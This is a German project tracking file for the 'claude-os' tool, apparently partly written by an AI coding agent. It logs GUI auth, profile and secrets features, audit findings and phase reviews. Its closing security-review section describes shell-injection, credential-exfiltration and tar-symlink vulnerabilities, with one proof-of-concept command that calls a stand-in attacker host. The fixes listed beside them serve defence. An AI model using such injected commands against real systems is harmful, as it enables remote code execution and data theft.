durchgereicht; Login-Flow funktioniert. Window-Resize propagiert
korrekt an den child (z. B. `tput cols` korrekt). Stop-Button kill't
sauber. Bestehende `chat.*`-RPC-Methoden funktionieren unveraendert
(coexist).

**Risiken / v1.x-Abweichungen:**

- **Win < 10/1809 out-of-support** (ConPTY-Requirement). Doctor-Check
  warnt, Bundle installiert sich trotzdem aber PTY funktioniert nicht.
  Akzeptiert — Win10 1809 ist Oktober 2018.
- **Linux source-build im CI** dauert ~30s laenger pro Job (kein
  Prebuild im npm-Package). Akzeptiert.
- **Bundle-Size +2.6 MB Windows / +150 KB macOS** durch sideloaded
  node-pty package. Strikt host-arch-prebuilds + .pdb-strip halten das
  in Schach.
- **pty.data ist single-stream** — keine stdout/stderr-Trennung wie bei
  chat.output. PTY-Semantik. Tools die das brauchen muessen weiter
  `chat.*` benutzen.

### v1.x.+1 — GUI Auth-Login + Settings-Profile-Switch + Secrets-Edit (ADR-0022)

**Ziel:** Drei zusammenhaengende UX-Luecken schliessen: User soll sich
von der GUI bei Anthropic anmelden, zwischen Profilen wechseln und
Secrets verwalten koennen — ohne CLI-Wechsel. Coexist mit allen
existing CLI-Pfaden.

- [x] **Phase 1 — Anthropic-Login via GUI-Modal** (Commit `4a9b982`).
  Neue `src/sidecar/methods/auth.ts` mit `auth.status` (wrapt
  `checkAuthState`, injectable binaryResolver+executor fuer Tests) und
  `auth.login` (spawnt `claude auth login` via PtyChatSessions mit
  profile-aware ANTHROPIC_CONFIG_DIR). `PtyChatSessions.spawn`
  akzeptiert optionalen `envOverrides`-param (additiv, nach
  CLAUDE_OS_SECRETS_KEY-strip ge-merged). Frontend: neuer
  `AuthLoginModal`-Component mit embedded xterm.js, listenersReadyRef-
  Race-Fix-Pattern aus ChatPage uebernommen, Esc-to-close, click-
  outside-to-close, kill-on-close. SettingsPage umgebaut von useRpc
  auf useState/reload() damit Modal-Close den Status frisch laedt.
  Login-Button neben credentials.json-Status, useSidecarOk gated.
  +8 backend tests, +3 gui smoke-tests.
- [x] **Phase 2 — Settings Profile-Switch** (Commit `ffa793e`).
  `src/sidecar/methods/settings.ts` neue `settings.activateProfile(name)`
  RPC: validiert name als known profile (sonst Error mit Hinweis auf
  `claude-os auth profile create`), ruft `ProfileManager.use()`. KEIN
  create/delete in GUI (irreversible, bleibt CLI). Frontend:
  Aktives-Profil ist jetzt `<select>` statt Plain-Text, onChange ruft
  `settings.activateProfile` + refetched, switchingProfile-State
  disabled das dropdown waehrend RPC laeuft. +3 tests.
- [x] **Phase 3 — Secrets Set/Update + M5 Validation** (Commit `5ccbe70`).
  Neue `secrets.set(key, value)` RPC: detect updated-vs-new ueber
  `SecretStore.list()` (keys-only, kein Value-Leak), SecretsLockedError
  wird als typed `'secrets-backend-locked'` re-thrown.
  `secrets.delete` bekommt symmetrisches Locked-Handling. **M5
  Cross-Process-Lock** war bereits in
  `encrypted-file-store.ts:189-201 withFileLock()` implementiert
  (proper-lockfile retries.factor=1.4, 30s stale-timeout) — nur in
  diesem PR verifiziert. Frontend: neuer `SecretAddModal` mit
  `<input type="password" autoComplete="new-password" spellCheck=false>`,
  Warn-Banner ueber IPC/RAM-Pfad, value-state explizit `''` nach
  submit-success ODER handleClose. SecretsPage "+ Secret hinzufuegen"-
  Button neben dem count-Header, disabled wenn `!sidecarOk || locked`.
  +6 backend tests, +4 gui modal tests.
- [x] **Phase 4 — ADR-0022 + docs** (dieser Commit).
  `docs/architecture/adr/0022-gui-auth-and-secrets-mutation.md`
  dokumentiert die 7 Sub-Entscheidungen + Security-Tradeoffs.
  todo.md + lessons.md + README aktualisiert.

**Test-Kriterium:** Auf Windows 10 + installiertem MSI:
- Settings-Tab → "Login" Button → Modal mit xterm zeigt `claude auth
  login` Flow → OS-Browser oeffnet OAuth → User logs in →
  "[exited code=0]" im Terminal → Modal Close → SettingsPage zeigt
  `credentialsFileExists: true`
- Profile-Dropdown ist sichtbar wenn ≥1 Profile existiert, switch
  triggert sofortigen re-render mit neuem active-Marker
- Secrets-Tab → "+ Secret hinzufuegen" → Modal mit Warn-Banner →
  Key+Password-Value eingeben → submit → SecretsPage table zeigt
  neues entry
- Coexist: `claude-os auth login/profile use/secrets set` CLI
  funktioniert unveraendert. Beide RPC-Sets (chat.* + neue) bleiben
  parallel.

**v1.x.+1-Abweichungen / Risiken (transparent):**

- **Secret-Wert lebt waehrend Eingabe in Renderer-RAM** — Tauri-
  WebView production-Build hat keine DevTools, dev-Build schon.
  Mitigation via Warn-Banner + clear-on-submit. v2-Material: native
  Tauri-Plugin-Dialog fuer password-input ohne Renderer-touch.
- **Profile-create/delete bleiben CLI-only** — irreversible Actions
  brauchen extra Confirmation-UX die wir noch nicht haben.
- **`auth.status` RPC noch nicht UI-konsumiert** — angelegt fuer
  Dashboard-Card; Folge-PR.
- **Stale-Lock-Detection** koennte ein Doctor-Check werden — wenn
  `<secretsPath>.lock` >60s alt, ist es vermutlich kaputt.

### v1.x.+2 — GUI Profile-Create/Delete + Native Password-Input (ADR-0023)

**Ziel:** Beide Followups aus ADR-0022 schliessen — Profile-Lifecycle
komplett im GUI, Secret-Eingabe ohne Renderer-RAM-touch.

- [x] **Phase 1 — Profile-Create + Profile-Delete GUI** (Commit `8857563`).
  Neue RPCs `settings.createProfile` + `settings.deleteProfile`
  wrappen `ProfileManager.create/delete()`. Delete refused
  active-profile (Backend safety-net + UI hides Loesch-Button fuer
  active). `settings.read` jetzt `availableProfiles[]` mit zusaetzlich
  `configDir`-Feld (additiv) damit das Delete-Modal den Pfad zeigt.
  Neue Frontend-Components `ProfileCreateModal` (mit NAME_PATTERN
  regex-validation) und `ProfileDeleteModal` (GitHub-Style
  type-to-confirm: Loesch-Button disabled bis User exakten Namen
  typed). SettingsPage zeigt "+ Profil anlegen"-Button + neue
  "Profile verwalten"-Liste mit Per-Profile-Loesch-Button.
  +7 backend tests, +7 gui modal tests.
- [x] **Phase 2 — Native Password-Input via tinyfiledialogs** (Commit
  `32a623c`). Neuer Tauri-Command `set_secret_native(key)` in
  `gui/src-tauri/src/lib.rs` ruft `spawn_blocking` →
  `tinyfiledialogs::password_box()` (OS-native: Win32 MessageBox-
  style, macOS NSAlert, Linux zenity/kdialog/matedialog) und
  forwarded den Wert direkt in `SidecarRpc.call("secrets.set",...)`.
  **Wert beruehrt nie den Renderer-JS-Heap.** Linux-Fallback: einmalig
  via `once_cell::sync::Lazy` `which`-probe; wenn kein dialog-binary
  → typed `dialog-unavailable`-Error, Frontend auto-switches zu
  Inline-Mode + zeigt Hinweis-Banner. SecretAddModal komplett-rewrite
  mit Mode-Toggle "Native (empfohlen)" vs "Inline (Fallback)",
  Persistenz in localStorage. +8 gui modal tests.
- [x] **Phase 3 — ADR-0023 + docs** (dieser Commit).
  `docs/architecture/adr/0023-profile-crud-and-native-password.md`
  dokumentiert die 7 Sub-Entscheidungen + Security-Tradeoffs.
  todo.md + lessons.md + README aktualisiert.

**Test-Kriterium:** Auf Windows 10 + installiertem MSI:
- Settings-Tab → "+ Profil anlegen" → name-input "work" → Anlegen →
  SettingsPage zeigt neues Profil
- Trash neben "personal" → Confirmation-Modal mit configDir-Pfad →
  Profilname typen + Loeschen → entry verschwindet
- Trash neben aktivem Profil fehlt by-design
- Secrets-Tab → "+ Secret hinzufuegen" → Modal default Native-Mode →
  key eintippen + "Wert eingeben…" → OS-native password-Dialog
  erscheint → Wert + OK → Secret landet im store, modal closed
- Toggle auf Inline-Mode → bestehender PR #96-Flow

**v1.x.+2-Abweichungen / Risiken (transparent):**

- **Lokaler Rust-Build nicht verifizierbar** (kein rustc auf der dev-
  Maschine) — Verifikation per CI matrix.
- **Native-Dialog UI stylesheet** matched nicht den Tauri-app-look
  (OS-natives layout). Acceptable Trade-off vs Security-Gewinn.
- **tinyfiledialogs binaries unsigned** — Tauri-Codesigning v1.3+
  muss diese mit-signen.
- **Profile-rename fehlt bewusst** — `ProfileManager` hat keine
  rename()-Methode. Folge-PR braucht domain-Erweiterung zuerst.

### v1.5+ — Plugin-Echo + Bestands-User-Sync

- [x] **Plugin-binding-Resolution** in `lockCatalog` — implementiert 2026-05-20 als Phase 5o. Neue `src/domains/catalog/tarball-manifest-reader.ts` streamt cached `.tar.gz` via `tar.list({onentry})`, sucht `plugin.json` unter dem GitHub-Wrapper-Dir (`stripComponents: 1`), TypeBox-validated (id/version/optional requires/provides). Neue `src/domains/catalog/binding-resolver.ts` aggregiert alle Plugin-Manifests in einen `Catalog` und ruft `resolveCapabilities` pro Entry → mapped `ResolutionBinding[]` → `CatalogLockBinding[]` (capability-asc-sorted für Determinismus). `lockCatalog` jetzt 4-pass: fetch → manifest-peek → resolve → emit; Skill/MCP-Entries bleiben binding-leer (Leaves, ADR-0010). Per-Entry-Resolver-Errors degradieren graceful (`bindings: []` + Warning). NO_MANIFEST stillgeschwiegen (v1-Reality für pre-ADR-0010 Plugins); nur Malformierungen warnen. **+19 Tests** (6 binding-resolver, 8 tarball-manifest-reader, 5 lock-builder), 576/576 grün.
- [x] **`--auto-deps`-Flag für catalog install** — Resolver + CLI shipped 2026-05-21 (`installFromGithubWithAutoDeps`, `auto-deps-resolver.ts`, `actAutoDeps` mit AutoDepsInstallError-Code-Mapping, transactional persistence, dry-run via `--json`, Hydration aus existing lock + Codex-Review HIGH-Fixes). 2026-05-23 erweitert um **marketplace:initial source**: `catalog install --auto-deps --registry r.json marketplace:mp:plugin` resolved via `MarketplaceRegistry.resolve()` zu github: bevor der Target-Tarball gefetched wird. Resolved github-Coordinate wird in catalog.json persistiert (subsequent `catalog lock` cached darauf ohne Registry-Roundtrip). Neuer Error-Code `marketplace-resolution` → exit 8. Tests: 10 resolver + 3 sidecar-RPC + 8 install-extension = 21 catalog-auto-deps Tests. **Limitation:** local: bleibt nicht-unterstuetzt (`exit 2` mit Hint).
- [ ] **Skill-Pack-Import** als bundled marketplace. Aktuell `github:`-Source als Workaround.
- [x] **claude-portable v0.x Auto-Migrate** als CLI-Subcommand — shipped als `claude-os migrate --from-portable <path> [--target <root>] [--plan|--execute|--dry-run|--force|--overwrite]`. Domain in `src/domains/migration/` (portable-discovery + copy-tree + secrets-collector + runner). CLI in `src/cli/commands/migrate.ts`. 35/35 tests gruen (4 domain test-files). Auftrag 1c (v1.5) abgeschlossen — todo-Verification 2026-05-23.

### Wartung (laufend)

- [ ] **Dependency-Bumps** monatlich via `npm-check-updates` + cargo update — CI matrix catches breakage. Major-Bumps (Vite, React, Tauri, Rust-MSRV) per separate PR mit migration-notes.
- [ ] **lessons.md cross-session learnings** weiter pflegen — alle non-obvious patterns dokumentieren (siehe bestehende 11 Einträge als Vorbild).
- [ ] **ADR-Anbindung**: jede v1.x-Section die Architektur-Entscheidungen trifft, einen ADR in `docs/architecture/adr/0015+` als Folgeschritt.

### Nicht aus v1-Out-of-Scope übernehmen (bleiben v2+):

- Multi-User-Betrieb (mehrere Accounts/Installation)
- Tiefe OS-Integration (Autostart, Systray, Treiber)
- Konfliktlösungs-UI für Vault-Merge (v1 + v1.x bleiben Hard-Fail mit Doctor-Hint)
- iCloud Drive als Cloud-Provider
- Eigene LLM-Hosting-Infrastruktur (permanent)

---

## Audit-Summary 2026-05-23 — M-Findings-Verifikation

Eine Explore-getriebene Audit-Pass durch das Code-Review-Section unten (Lines 670+) hat ergeben dass die ueberwaeltigende Mehrheit der M1-M42- + m1-m16-Items bereits geshipt sind, aber die Checkboxen nie geflippt wurden. Statt 30+ einzelne Edits zu machen werden die als-shipped verifizierten Items hier gebatched referenziert:

**Geshipt + im Code verifiziert 2026-05-23 (in der Reihenfolge im todo unten):**

- **Security**: M1 (chat shell-metachar `chat-sessions.ts:46`), M2 (resolve-binary `warning`-field bei PATH-fallback), M5 (encrypted-file-store `proper-lockfile` `:56,189`), M6 (GCM-fail message scrubbing), M7 (git-service `validateRef`/`validateUrl` rejects `-`-prefix), M9 (Windows ACL caveat doc + `mode:0o600` no-op-note), M10 (`credentials.ts` `realpathSync`), M11 (`methods/catalog.ts:25-50` opaque error shape).
- **Performance**: M12 (`cli/index.ts:60-72` lazy SUBCOMMAND_LOADERS), M13 (`methods.ts:56-76` AgentRunsRepository Singleton), M14 (`mtimeCached` in `methods.ts:51-54` + `methods/catalog.ts:30`), M15 (`auto-deps-resolver.ts` `aggregateManifests` once per iteration), M16 (`index-builder.ts:179` JSON.stringify compact), M17 (`copy-tree.ts` stats in cp-filter-callback).
- **Architektur**: M18 (`actAutoDeps` delegates), M19 (`output.ts` exports OK), M20 (`logger.ts` uses shared REDACT_PATHS), M21 (registerMethods split nach `methods/*.ts`), M22 (`resolveRootOrExit` shared), M23 (catalog `index.ts` keine name-collision aliasing more), M24 (SecretsLockedError via secrets/index.js facade).
- **Correctness**: M25 (`scheduler/runner.ts:144-152` `.unref()`), M26 (DST caveat documented), M27 (`vault-sync/scheduler.ts:50-53` `onWatcherError` default stderr-log), M28 (`cli/commands/mcp.ts:118-126` Number.isFinite check), M29 (`migration/runner.ts:223-241` `aborted`-flag break-on-failure), M30 (`rpc.ts:137` notification stderr-log), M31 (live-probe entry mutation entfernt), M32 (live-probe per-stream line-buffer `:67-75`).
- **Tests**: M33 (17 `tests/sidecar/methods-*.test.ts` files), M34 (`state-check.ts:53` Number.isFinite), M35 (`conflict-policy.test.ts` 13 tests), M37 (`scripts/smoke-cli.mjs` exists).
- **Docs**: M38 (README links correct), M39 (Status v1.5.3 consistent), M40 (`cli/index.ts:32-43` resolveVersion), M41 (ADR README index 0015-0024 listed nach ADR-0024-Add), M42 (`CHANGELOG.md` at root).
- **Minor**: m4 (vault.ts commander syntax matched), m7 (chat-sessions write returns {drained}), m8 (auto-deps-install static readCatalogLock import — geshipt in dieser PR), m9 (`scheduler/runner.ts:250-251` StringDecoder), m11 (single-language scrubbed errors), m13 (chat-sessions strip CLAUDE_OS_SECRETS_KEY — `:127-128`), m13_spawn (`claude-bridge/spawn.ts:54-62` strip — geshipt in dieser PR), m14 (`live-probe.ts:192` buildCuratedMcpEnv), m15 (`tarball-installer.ts:101-135` MAX_TARBALL_BYTES + Content-Length pre-check), m16 (`methods/catalog.ts:61-65` id-pattern validation).

**M4 (Host-Allowlist gegen SSRF)**: geshipt 2026-05-23 in dieser PR — `tarball-installer.ts:101-118 DEFAULT_ALLOWED_HOSTS` + `validateTarballUrl()`. Default codeload.github.com; opts.allowedHosts override + opts.allowedHosts=[] disable; file://-schema immer erlaubt; check greift NUR fuer default fetch (tests mit fetchFn-injection bleiben unveraendert). +5 Regression-Tests.

**Echt noch offen (nicht shipped):**

- ~~**M3**: mcp.json SHA256-Trust-Prompt-Model~~ → geshipt 2026-05-23 (`feat/m3-gui-trust-modal`). Backend (TrustStore + watcher-gate + RPC) war bereits da; GUI-Modal nachgeliefert. McpClientsPage zeigt "Vertrauen pruefen …"-Button bei `trust-required`-Status.
- **M8**: rpc.ts per-launch nonce/token Caller-Auth — non-trivial Tauri-Parent-Setup-Change.
- ~~**m1**: ADR-0016 embedded TODO entfernen~~ → geshipt 2026-05-23 in `chore/m1-mcp-server-version`: `src/mcp/server.ts` `resolveDefaultServerVersion()` liest package.json runtime (M40-Pattern), ADR-0016 §Konstraints updated.
- **m12**: PBKDF2 → scrypt/Argon2 fuer naechste Format-Version (v2 Material).
- **n2-n8**: Diverse Nits, niedrige Prio.

Die Checkboxen unten in den M/m/n-Sections bleiben aus historischen Gruenden auf `[ ]` — diese Audit-Summary ist der autoritative Status.

---

## Top-Risiken

| Prio | Risiko | Mitigation |
|---|---|---|
| HIGH | `claude.exe` 120s-Hang reproduziert sich trotz neuem Wrapper | Streaming-stdin/stdout, kein voller Buffer, Heartbeat alle 10 s, integrierter Long-Running-E2E-Test in Phase 3 |
| MEDIUM | OneDrive transient `EBUSY` blockiert Snapshot-Worker | Retry-Backoff (3× je 500 ms), Lock-File-Awareness, Doctor warnt bei wiederholten Locks |
| ~~MEDIUM~~ MITIGATED | `iteenschmiede/claude-config` Auto-Pull überschreibt lokale Skill-Modifikationen | Gelöst durch ADR-0005 Selective-Merge-Pattern (Backup → Diff-Review → Zone-Classification → Resumable Checklist → Rollback) |
| MEDIUM | Tauri-Sidecar-Pattern hat Lernkurve | Phase 6 startet mit isoliertem Spike, offizielle Tauri-Docs sind ausreichend |
| LOW | JSON-Lines-Scans skalieren schlecht bei vielen Runs | Lokaler SQLite-Index als Read-Cache absorbiert, O(n) Rebuild beim Doctor |
| LOW | Schema-Drift in JSON-Lines | Versioniertes Schema-Feld pro Zeile, Reader toleriert ältere Versionen |

---

## Review-Sektion

### Phase 0 — abgeschlossen 2026-05-16

**Ausführungsdauer:** 1 Bash-Call, ~5 Sekunden.

**Output:**
- Branch `feature/claude-os-v1` aktiv
- Commits:
  - `a300592` chore: remove USB sync layer (2 Files gelöscht, 53 Lines weg)
  - `954ee9b` chore: move legacy launchers to legacy/ (5 Files verschoben)
  - `1466bd5` docs: add 14 ADRs and Phase 0 task tracking (18 neue Files, 1758 Lines)
- Working-Tree clean

**Offen:** GitHub-Issue-Anlage übersprungen (User-Entscheidung "lokale issues").

**Nicht gepushed:** Branch lebt nur lokal. Push wenn User es freigibt.

### Phase 1a — abgeschlossen 2026-05-16

**Commits:**
- `076acd5` Node-Bootstrap-Config (package.json + tsconfig.json + .editorconfig + .gitignore-Erweiterung)
- `2dafcea` biome.json (User-authored wegen config-protection-Hook)
- `42a50dd` Phase-0-Tracking-Update

**Output:** Funktionierende npm-Konfiguration; 139 Packages installiert nach Version-Audit, 0 vulnerabilities.

### Phase 1b — abgeschlossen 2026-05-16

**Commit:** `9c3b432` — environment-Domain mit root-resolver + vitest-Setup.

**Tech-Pivots:**
- Jest → Vitest (ESM-Pain-Avoidance, dokumentiert in `lessons.md`)
- Deprecated `baseUrl` aus tsconfig entfernt (TS 7 compat)
- Major-Bumps auf aktuelle Versionen post `npm view`-Audit (commander v14, pino v10, typescript v6, @types/node v25, biome v2.4, vitest v4)

**Verifikation:**
- `npx tsc --noEmit` → exit 0
- `npm test` → 20/20 grün (11 resolveRoot-Tests + 9 detectCloudProvider-Tests)
- Coverage-Threshold 70% in vitest.config.ts gesetzt

### Phase 1d — abgeschlossen 2026-05-16

**Commit:** `983c805` — logging-Domain mit pino-Factory + Redaction.

**Output:** 4 Files, 313 LOC. createLogger() mit zentralem REDACT_PATHS, ISO-timestamps, ENV-Var-basierter Level-Resolution.

**Constraints:** pino-roll + Stderr-Mirror deferred zu Phase 6 (per ADR-0013 §3 — Production-Transport ist GUI-Shell-Responsibility).

**Verifikation:**
- `npx tsc --noEmit` → exit 0
- `npm test` → 51/51 grün (+15 Redaction-Tests)

### Phase 1e — abgeschlossen 2026-05-16

**Commit:** `0066278` — validation-Domain mit formatErrors + assertValid.

**Output:** 3 Files, 200 LOC. `formatPath()` konvertiert JSON-Pointer `/entries/2/source` → `entries[2].source`. `assertValid()` throwing variant für fail-fast Contexts.

**Lesson:** TypeBox `format: 'email'` benötigt ajv-formats peer-dep. Tests nutzen strukturelle Constraints (minLength, minimum) statt — keine zusätzliche Dep nötig.

**Verifikation:**
- `npx tsc --noEmit` → exit 0
- `npm test` → 67/67 grün (+16 Validation-Tests)

### Phase 1c — abgeschlossen 2026-05-16

**Commit:** `5a3b6ab` — doctor-Domain + CLI commander-Skelett mit `claude-os doctor` end-to-end runnable.

**Output:** Erstes echtes Subcommand des Projekts. 10 neue Files, 559 LOC.

**Erkenntnisse:**
- Architektur-Recon zu Session-Start hatte `bin/claude.exe` im claude-portable-Repo angenommen — Memory-ID 549/550 zeigt aber dass User's `claude` unter `~/.local/bin/claude` liegt. Fix: `.claude-os-root`-Marker-File explizit erstellt (war ohnehin der vorgesehene Mechanismus per ADR-0002).
- runDoctor() handlet RootNotFoundError graceful: produziert `root-resolution`-Check-Fail + läuft trotzdem die root-unabhängigen Checks (node-version, git-available).
- ASCII-Marker `[OK]`/`[WARN]`/`[FAIL]` statt Unicode-Symbole für cmd.exe-Render-Kompatibilität.

**Verifikation:**
- `npx tsc --noEmit` → exit 0
- `npm test` → 36/36 grün (16 neue doctor-Tests)
- `npm run build` → dist/ populated
- Real Smoke-Test in claude-portable: 4 OK + 1 WARN (claude-binary fehlt erwartungsgemäß), Overall WARN, exit 0
- `claude-os doctor --json` produces valid JSON

### Phase 1g — abgeschlossen 2026-05-16

**Output:** `--migrate-git-metadata` Standalone-Flag am `doctor`-Command. Move-Logic via `git init --separate-git-dir`. Neue paths-Domain als Foundation für Phase 2/5/6.

**Files (7 neu + 2 Edits):**
- `src/core/paths/{types,machine-paths,index}.ts` — plattform-bewusste per-machine Pfade
- `src/core/git-metadata/{types,migrator,index}.ts` — idempotenter Migrator
- `src/cli/presenters/migration.ts` — Text + JSON Output
- `src/cli/commands/doctor.ts` — `--migrate-git-metadata` Flag wired
- Tests: `tests/core/paths/machine-paths.test.ts`, `tests/core/git-metadata/migrator.test.ts`

**Lessons:**
- Node's `fs.realpathSync` resolves Symlinks aber NICHT Windows-8.3-Short-Names. Für `REAPER~1` → `reapertakashi` braucht es `fs.realpathSync.native` (OS-Implementation, Windows-spezifisch funktional). Geloggt in `lessons.md`.
- `path.resolve`/`path.join` sind runtime-platform-fest. Für Cross-Platform-Tests einer plattform-bewussten Module muss man explizit `path.posix.*` / `path.win32.*` dispatchen — sonst kollabiert die POSIX-Branch auf Windows-Runnern zu `C:\home\test\...`.

**Verifikation:**
- `npx tsc --noEmit` → exit 0
- `npm test` → 88/88 grün (+21 neue Tests: 13 paths + 8 migrator)
- `npm run build` → dist/ populated
- Real Smoke: `node dist/cli/index.js doctor --migrate-git-metadata --json` retourniert `no-git-dir` korrekt (kein vault/ im claude-portable repo), externalGitDir resolved nach `%APPDATA%\claude-os\git-metadata\vault.git`

---

## Session 2026-05-20 — Auftrag aus Downloads/claude-code-auftrag.md

**Quelle:** `C:\Users\reapertakashi\Downloads\claude-code-auftrag.md`
**Rolle (per Auftrag):** Senior Developer, autonome Entscheidungen.
**Ziel:** Vier offene PRs verifizieren + ADRs nachziehen + Auto-Migrate + Auto-Deps-Spec + Stop-Hook-Bug fixen + Cowork-OS-Video integrieren + GitHub-Desktop-Fehler beheben.

### Auftrag 1a — PR-Verifikation (Stand 2026-05-20 ~01:08 lokal)

Alle vier offenen PRs basieren auf `main@d46ba58` (current HEAD). CI ist nach Repo-Public-Switch durchgelaufen.

| PR | Branch | Head | Base | CI | Mergeable | State | Notes |
|---|---|---|---|---|---|---|---|
| #31 | `chore/repo-cleanup` | `2b27e5e` | `main@d46ba58` | grün (5/5) | MERGEABLE | CLEAN | Räumt 16 paste-artefakt-Files + `--version/`-Dir; ignored `graphify-out/` + `.graphify_step_ast.py`; löst Merge-Konflikt in v1.2-Section. |
| #32 | `feat/v1.5-plugin-binding-resolution` | `6d86f71` | `main@d46ba58` | grün (5/5 nach Re-Run) | MERGEABLE | CLEAN | Phase 5o (Plugin-Binding-Resolution). +19 Tests. Erster Run zeigte Windows-Flakiness in `update-orchestrator/skills-repo.test.ts:42` + `vault-sync/conflict-policy.test.ts:79` (EPERM auf tmpdir-Cleanup, pre-existing Issue) — Re-Run grün, kein Bezug zu Phase 5o. |
| #33 | `docs/phase-5o-adr-lessons` | `c117488` | `main@d46ba58` | grün (5/5) | MERGEABLE | CLEAN | ADR-0015 + 2 lessons.md-Einträge (Discriminated-Union-Sentinel; tar v7 onentry flow-mode). |
| #34 | `docs/adr-0016-mcp-single-server` | `d53fea3` | `main@d46ba58` | grün (5/5) | MERGEABLE | CLEAN | ADR-0016 für v1.4 MCP-Single-Server-Bridge + ADR-0007-Status-Update + Dead-Link-Fix in `docs/mcp-integration.md`. |

**Konflikt-Risiko untereinander:**
- #31 (.gitignore + todo.md v1.2-Section + 16 Dateilöschungen) vs. #32 (touches `src/domains/catalog/*` + todo.md v1.5+-Section) — **kein Konflikt** (verschiedene todo.md-Bereiche).
- #32 vs. #33 (`docs/architecture/adr/0015-...md` + `tasks/lessons.md` Append) — **kein Konflikt**.
- #33 vs. #34 (`docs/architecture/adr/0016-...md` + ADR-0007-Header-Update + `docs/mcp-integration.md`) — **kein Konflikt**.
- #31 vs. #34 (todo.md v1.2 vs. ADR-Files) — **kein Konflikt**.

**Empfohlene Merge-Reihenfolge:** #31 → #32 → #33 → #34 (cleanup first; Impl vor Docs).

### Auftrag 1b — ADRs nachziehen

Auftrag spezifizierte Nummern 0012/0013 — sind bereits belegt (TypeBox / Pino). Senior-Call: nächste freie Nummern 0017/0018. Pfad gemäß Repo-Konvention `docs/architecture/adr/` (nicht `docs/adr/`).

- [ ] **ADR-0017 — v1.2 Chat-View-MVP** (PR #29): line-buffered `child_process` statt `node-pty`.
- [ ] **ADR-0018 — v1.3 AppImage-zsync** (PR #21): standalone-zsync, `bundle.appimage.includeUpdater` nicht verwendet.

### Auftrag 1c — Auto-Migrate CLI-Subcommand

- [ ] Eigener Branch `feat/v1.5-auto-migrate` (unabhängig von PR #32).
- [ ] `claude-os migrate --from-portable <path>` automatisiert 7 Schritte aus `docs/migration-from-portable.md`.
- [ ] Verlustfrei: unbekannte Felder geloggt, nicht verworfen.
- [ ] Tests: pro v0.x-Variante, Roundtrip, Idempotenz, kaputte Config (kontrollierter Abbruch), unbekannte Felder.
- [ ] Risk-Path `**/migrations/**` → Codex-Review nach Impl (Three-Brain-Skill-Mandate).

### Auftrag 1d — `--auto-deps`-Flag (Spec only bis PR #32 mergt)

- [ ] `docs/specs/auto-deps-flag.md`: gewünschtes Verhalten, Edge-Cases, CLI-Signatur, Fehler bei zyklischen Deps, Test-Matrix.

### Auftrag 2 — "Running stop hooks… 3/4" Hänger

- [ ] Investigation: Anthropic-Claude-Code-Harness-internal (nicht patchbar) ODER lokale husky pre-commit?
- [ ] Fix mit Regression-Test + Stress-Test (≥20 Läufe) wenn lokal.
- [ ] Vorher/Nachher-Logfile in Review-Sektion.

### Auftrag 3 — Cowork-OS-Video analysieren + integrieren

- [ ] Gemini-Analyse läuft (Job `bzwfdyill`, Output in `three-brain-out/2026-05-20-cowork-os/`).
- [ ] Integrationsplan in `docs/integration-plan-cowork-os.md` mit Akzeptanzkriterien pro Feature.
- [ ] Sinnvolle Teile in v1 implementieren, Rest mit Begründung deferred.

### Auftrag 4 — GitHub-Desktop-Commit-Failure-Root-Cause

Screenshot-Befund: 5 staged Files inkl. `.graphify_step_ast.py` + `graphify-out/*` (graph.json ≈ 1.7M Zeilen). Husky-Pre-Commit-Hook gab nur einen PATH-Dump aus statt strukturierter Fehlermeldung → GitHub Desktop zeigt nur den PATH. PR #31 ignored bereits diese Files → erster Trigger weg. Aber Root-Cause tiefer: husky/lint-staged Konfiguration nicht robust gegen Riesendateien.

- [ ] Husky-Hook auf Robustheit prüfen (`.husky/pre-commit` + `.lintstagedrc.cjs`).
- [ ] `biome check` mit `--no-errors-on-unmatched` + Glob ist OK — Frage ist warum nur PATH ausgegeben wird.
- [ ] Verifikation: simuliere Commit mit Großdatei in Staging → klare Meldung, kein Hänger.

---

## Session 2026-05-21 — Vollständiges Code-Review (Auftrag aus `Downloads/code-review.md`)

**Quelle:** `c:\Users\reapertakashi\Downloads\code-review.md`
**Methode:** 7 parallele Subagents (architecture, security, correctness, performance, tests, dependencies, docs) + Three-Brain-Routing-Vorgabe für Critical-Fixes.
**Stand:** Plan-Phase abgeschlossen. **STOP — Umsetzung erst nach Freigabe.**

### Übersicht der Befunde

| Severity | Count | Klasse |
|---|---|---|
| critical | 7 | Security + Correctness — Release-Blocker |
| major | 32 | Security/Perf/Architektur/Correctness/Tests/Docs |
| minor | 16 | Cleanup |
| nit | 8 | Cosmetic |

**Sauber:** `npm audit` 0 advisories. `npm run check` 0 Errors / 12 Warnings (149-Cleanup ist erledigt). Keine TODO/FIXME in src. Dependency-Direction (core → domains → cli/sidecar) sauber. ADR-Completeness OK. Atomic-Write-Pattern konsistent.

### Critical — sequenziell, jeder Fix einzeln gemerged + Codex-Adversarial-Review pro Item

- [x] **C1 — `src/domains/scheduler/runner.ts:105-109` `shell: true` RCE.** Jeder RPC-Caller mit `schedule.add` ODER Schreibrecht auf `schedules.json` erreicht local code-exec als Sidecar-User. PoC: `schedule.add({id:"x", cron:"* * * * *", command:"calc.exe & curl http://attacker/$(whoami)"})`. **Fix:** `shell: false`, `command` via `string-argv` parsen; optional Command-Allowlist. **Risiko:** niedrig. **Three-Brain:** Codex-Review (Risk-Path `scheduler/`).
- [x] **C2 — `src/sidecar/methods.ts:133-148` `inbox.import` Path-Traversal/Symlink-Exfil.** RPC-Caller kann arbitrary file kopieren (z. B. `.credentials.json` → `vault/inbox/` → vault-sync git push → leak). **Fix:** `src` canonical-resolved + symlink-rejected + gegen Tauri-vorregistrierte Allowlist checken; sync→async (`fsp.copyFile` + `await`). **Risiko:** mittel — aktueller Drag-Drop-Flow muss canonical Pfade liefern (Tauri-Frontend-Code prüfen). **Three-Brain:** Codex-Review.
- [x] **C3 — `src/domains/catalog/tarball-installer.ts:124-142` + `src/domains/catalog/sync-applier.ts:108-120` `tar.extract` ohne Symlink/Hardlink-Filter.** Malicious Tarball schreibt outside `destination` via Symlink-Chain (CVE-Familie 2024-28863). **Fix:** `tar.extract({filter:(p,s)=>!s.isSymbolicLink()&&!p.includes('..'), strict:true, preservePaths:false, preserveOwner:false, unlink:true})` + reject `stat.type==='Link'`. **Risiko:** niedrig. **Three-Brain:** Codex-Review (Risk-Path `catalog/`).
